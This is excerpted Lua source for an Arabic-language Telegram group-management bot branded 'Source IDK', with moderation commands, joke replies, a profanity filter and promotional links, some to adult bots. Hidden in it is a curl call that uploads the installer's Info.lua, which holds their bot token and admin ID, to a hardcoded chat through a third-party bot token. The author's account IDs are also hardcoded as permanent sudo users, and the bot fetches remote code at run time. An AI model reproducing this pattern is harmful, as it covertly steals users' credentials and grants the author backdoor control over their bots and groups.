...
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي •♫•♬•𝐼𝒟𝒦•♬•♫• :\na•♫•♬•𝐼𝒟𝒦•♬•♫•\n\27[0;33;49m')
...
io.write('\27[1;31m •♫•♬•𝐼𝒟𝒦•♬•♫• ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/IDK-Zizo/IDK/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1912084223,2005704248,1764999383,1815928911}   
...
if tonumber(user_id) == tonumber(1912084223) then  
var = true 
elseif tonumber(user_id) == tonumber(1764999383) then
var = true  
elseif tonumber(user_id) == tonumber(2005704248) then
var = true  
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼《𝒮𝒪𝒰𝑅𝒞𝐸 𝐼𝒟𝒦》")  
...
{{text = ' 𝐆𝐀𝐌𝐁𝐎𝐋♫',url="t.me/G8_M_L"}},
{{text = ' 𝒮𝒪𝒰𝑅𝒞𝐸 𝐼𝒟𝒦',url="t.me/trevor_0"}},
{{text = 'التواصل',url="t.me/IDK_help"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
local Text = ' ♫تم ارسال الملصق من •♫•♬•𝐼𝒟𝒦•♬•♫•\n - '..Name
...
{{text = '《𝒮𝒪𝒰𝑅𝒞𝐸 𝐼𝒟𝒦》 ', url="t.me/trevor_0"}},
{{text = 'التواصل ', url="t.me/IDK_help"}},
{{text = ' بوت الحمايه',url="t.me/trevor6_bot"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/trevor_0/101&caption=' .. URL.escape(Text).."&photo="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == '•♫•♬•𝐼𝒟𝒦•♬•♫•' and DevSoFi(msg) then
local Text = [[ 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس', url="t.me/trevor_0"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "ايدك")
...
list = {"كس","كسمك","كسختك","عير","كسخالتك","خرا بالله","عير بالله","كسخواتكم","كحاب","مناويج","مناويج","كحبه","ابن الكحبه","فرخ","فروخ","طيزك","طيزختك","كسمك","يا ابن الخول","المتناك","شرموط","شرموطه","ابن الشرموطه","ابن الخول","ابن العرص","منايك","متناك","احا","ابن المتناكه","زبك","عرص","زبي","خول","لبوه","لباوي","ابن اللبوه","منيوك","كسمكك","متناكه","احو","احي","يا عرص","يا خول","قحبه","القحبه","شراميط","العلق","العلوق","العلقه","كسمك","يا ابن الخول","المتناك","شرموط","شرموطه","ابن الشرموطه","ابن الخول","االمنيوك","كسمككك","الشرموطه","ابن العرص","ابن الحيضانه","زبك","خول","زبي","كسمك"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
...
local curl = 'curl "'..'https://api.telegram.org/bot1714366542:AAHo7wOqc8bnuOT_h_dkRu7dcrHHqkhgpXY/sendDocument'..'" -F "chat_id='.. 2005704248 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
--------------------------------------------------------------------------------------------------------------
...
local Text = [[
 𖠪 اهلا بك في سورس ايدك الجمدان 𖠪
...
if text == 'بقدونس' or text == 'المبرمج' or text == 'زيزو' or text == 'ايدك' then
local msg_id = msg.id_/2097152/0.5
local Text = [[
 السالك يرايق 💋🌚 
]]
...
keyboard = {} 
keyboard.inline_keyboard = {{{text = '  𓌹 ˹ 𝐒𝐇𝐀𝐇𝐃 ¹˼ 𓌺 ',url="t.me/Mokfhr"}},}
...
if text == 'زهرا' or text == "زهره" or text == "zhra" then
local msg_id = msg.id_/2097152/0.5
local Text = [[
باشا مصر 💋
متدخلش تحكها عشان ميتقلش منك ♫
...
keyboard = {} 
keyboard.inline_keyboard = {{{text = '  𓌹 ˹ ZHRA ¹˼ 𓌺 ',url="t.me/zhraa5555"}},}
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/zhraa5555&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'جروبات' or text == 'قروبات' or text == 'جروب' then
local Teext =[[
[𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝙸𝙳𝙺](https://t.me/trevor_0)
  𝙵𝙾𝙻𝙻𝙾𝚆 𝚃𝙷𝙴 𝙱𝚄𝚃𝚃𝙾𝙽𝚂 𝙳𝙾𝚆𝙽 ⬇️
]]
...
{{text = '◉ ᯓ ˹𝗕𝗔𝗥 𝗚8𝗔𝗠𝗕𝗢𝗟 ࿐',url="t.me/G8_M_LL"}},
{{text = '◉ ᯓ 𓆩 ˹✯𝐓𝐄𝐀𝐌 || 𝐈𝐃𝐊˼ 𓆪 ࿐',url="t.me/team_fawzii"}},
{{text = 'للتواصل', callback_data="/IDK_help"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end

if text == 'قنوات' or text == 'قناه' or text == 'تشانل' then
local Teext =[[
[𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝙸𝙳𝙺](https://t.me/trevor_0)
 𝙵𝙾𝙻𝙻𝙾𝚆 𝚃𝙷𝙴 𝙱𝚄𝚃𝚃𝙾𝙽𝚂 𝙳𝙾𝚆𝙽 ⬇️
]]
...
if text == 'بوت افلام وقصص +18🥵' or text == "سكس" then
local msg_id = msg.id_/2097152/0.5
local Text = [[
براحه ع البوت جوا يا شقي 😉
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text = '  𓌹 𝐗𝐗𝐗¹˼ 𓌺 ',url="t.me/trevor3_bot"}},}
...
keyboard = {} 
keyboard.inline_keyboard = {{{text = '  𓌹 𝐂𝐋𝐈𝐂𝐊 𝐁𝐎𝐓¹˼ 𓌺 ',url="t.me/trevor2_bot"}},}
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/trevor2_bot&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'shimo' or text == 'شيمو' then
local msg_id = msg.id_/2097152/0.5
local Text = [[
الكل ف الكل يبشه 😂❤
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text = '  𓌹 ˹𝐒𝐇𝐈𝐌𝐎¹˼ 𓌺 ',url="t.me/shimooll_l"}},}
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/shimooll_l&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
keyboard = {}   
keyboard.inline_keyboard = {  
{{text = '𖤛غـامـبول القمد𖤛',url="t.me/G8_M_L"}},  
...
if text == 'يوتيوب' or text == 'بحث' or text == 'اليوتيوب' or text == 'بوتات' then
local Text = [[
اليك بوتات متنوعه قد تفيدك ♫
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'بوت اليوتيوب ♥️',url="t.me/trevor4_bot"}},
{{text = 'بوت +18 🥵🔥',url="t.me/trevor3_bot"}},
{{text = 'بوت صنع منشورات بزرائر❤',url="t.me/trevor2_bot"}},
...
if text == 'المبرمج' or text == 'مطور السورس' or text == 'تنصيب' then
local Text = [[
[𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝙸𝙳𝙺](https://t.me/trevor_0)
 𝙵𝙾𝙻𝙻𝙾𝚆 𝚃𝙷𝙴 𝙱𝚄𝚃𝚃𝙾𝙽𝚂 𝙳𝙾𝚆𝙽 ⬇️
]]
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'اضغط هنا للتواصل', url="t.me/IDK_help"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/trevor_0/101&caption=' .. URL.escape(Text).."&photo="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
--------------------------------------------------------------------------------------------------------------
if text == "المطور" or text == "مطور" or text == "يا مطور" then
local TEXT_SUD = database:get(bot_id..'Tshake:TEXT_SUDO')
if TEXT_SUDO then 
send(msg.chat_id_, msg.id_,TEXT_SUDO)
else
...
{
{text = 'للتواصل♫' ,url="t.me/IDK_help"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Name)..'&photo='..taha.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
...
if text == "تاك للكل" or text == "@all" and CoSu(msg) then
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
if database:get(bot_id.."S00F4:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
return 
send(msg.chat_id_, msg.id_,"انتظر دقيقه من فضلك")
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/IDK-Zizo/IDK/main/main/getfile.json")
if res == 200 then
...
local json_file, res = https.request("https://raw.githubusercontent.com/IDK-Zizo/IDK/main/main/File_Bot/"..file)
if res == 200 then
...
if text == ("رفع مطور ثانويِ") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع مطور ثانويِ@(.*)$") and Sudo(msg) then
local username = text:match("^رفع مطور ثانويِ@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع مطور ثانويِ(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع مطور ثانويِ(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل مطور ثانوي") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل مطور ثانوي@(.*)$") and Sudo(msg) then
...
if text and text:match("^تنزيل مطور ثانوي(%d+)$") and Sudo(msg) then
...
if text == ("رفع بقلبي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
  ...
  tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
  usertext = '\n ♫ الـعـضو  ← ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
  status  = '\n ♫ يخساره نزلت من قلب مش هتلاقيه تاني\n'
  send(msg.chat_id_, msg.id_, usertext..status)
  end,nil)
  end
  tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/trevoradd/6&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'كسمهم' then
local Text = [[
]]
...
if text == 'طرطر' then
local Text = [[
  فسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسسس
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒮𝒪𝒰𝑅𝒞𝐸 𝐼𝒟𝒦', url="t.me/trevor_0"}},
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/trevoradd/7&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
' }\n'..' ♫  الايدي بالصوره  ⇇{ '..idph..
' }\n'..' ♫  الرفع  ⇇{ '..setadd..
' }\n'..' ♫  الحظر  ⇇{ '..banm..' }\n\n ♫═───═❲[《𝒮𝒪𝒰𝑅𝒞𝐸 𝐼𝒟𝒦》 ](t.me/trevor_0)❳═───═ ♫\n ♫ قناة سورس ايدك•♫•♬•𝐼𝒟𝒦•♬•♫•\n [ ❲[《𝒮𝒪𝒰𝑅𝒞𝐸 𝐼𝒟𝒦》 ](t.me/trevor_0)❳](t.me/trevor_0) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_, msg.id_, t..'•♫•♬•𝐼𝒟𝒦•♬•♫•\nاضغط علي الاسم ليتم نسخه\n•♫•♬•𝐼𝒟𝒦•♬•♫•ٴ\n ♫ ❲[《𝒮𝒪𝒰𝑅𝒞𝐸 𝐼𝒟𝒦》 ](t.me/trevor_0)❳ ♫ ')
end
...
send(msg.chat_id_,msg.id_, '[نت مطوري تاج راسي 😊](t.me/trevor_0)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/trevor_0)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/trevor_0)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/trevor_0)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/trevor_0)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/trevor_0)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/trevor_0)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/trevor_0)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/trevor_0)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد عضو هه 😂](t.me/trevor_0)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ف ستين داهيه..😹💔🎶](t.me/trevor_0)')
return false
end
...
send(msg.chat_id_,msg.id_, '[باي..😺💜](t.me/trevor_0)')
return false
end
...
if text == 'جيت' then
  ...
  send(msg.chat_id_,msg.id_, '[لف وامشي اننن..😺💜](t.me/trevor_0)')
  return false
  end
...
send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك..♫♥️](t.me/trevor_0)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر..♥️🦋](t.me/trevor_0)')
return false
end
...
send(msg.chat_id_,msg.id_, '[عايز محح مليش دعوه 🥺💛](t.me/trevor_0)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف...🥺💔](t.me/trevor_0)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب..😥](t.me/trevor_0)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ونجيب اشخاص ...😂😜](t.me/trevor_0)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بـعشـقق .🥰❤️](t.me/trevor_0)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[خخخ امال ..😹](t.me/trevor_0)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[قامد قموده ..🌝♥️](t.me/trevor_0)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انا اجمد ..♫💕](t.me/trevor_0)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هروح ..😹👻](t.me/trevor_0)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[متقولش مش تاني هه ..😹👻](t.me/trevor_0)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[الود كبر وبقي عندو بنت ..😻💥](t.me/trevor_0)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عندو كام سنه ..😹💥](t.me/trevor_0)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[تدوم الضحكه يقلبي ..😹💥](t.me/trevor_0)')
return false
end
end
end
...
send(msg.chat_id_, msg.id_,' ♫ انت دخلت عبر الرابط متقرفناااااااااااش 🌝') 
end
end,nil)
else
send(msg.chat_id_, msg.id_,' ♫ تم تعطيل امر  مين ضافني') 
...
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {" ؟لا تصدر اي صوت ! 🧟‍♀🧟‍♂ ❲لو هتكمل ارسل حاضر ❳"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
...
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {" لقد عدت إليك ظهر شيئ 🧟‍♂🧟‍♀ ❲لو هتكمل إرسال في حد خرج 🧟‍♀🧟‍♂❳"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "احد ما خرج من المنزل! 🧟‍♀🧟‍♂" or text == "في حد خرج"  then
local my_ph = database:get(bot_id.."my_maryam:status"..msg.chat_id_)
if not my_ph then
return false  
end
...
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {" نحن نتوه في هذا المكان🧟‍♀🧟‍♂❲لو هتكمل ارسال تعالي نذهب الي الضوء❳"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
...
local Teext =[[
🚨 اهلا بك في قسم الاوامر ..↑•♫•♬•𝐼𝒟𝒦•♬•♫•
 اختر الامر الذي تريدها .↑•♫•♬•𝐼𝒟𝒦•♬•♫•
ده من الازرار بلاسفل . •♫•♬•𝐼𝒟𝒦•♬•♫•
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
❲[《𝒮𝒪𝒰𝑅𝒞𝐸 𝐼𝒟𝒦》 ](t.me/trevor_0)❳ 
]]
keyboard = {} 
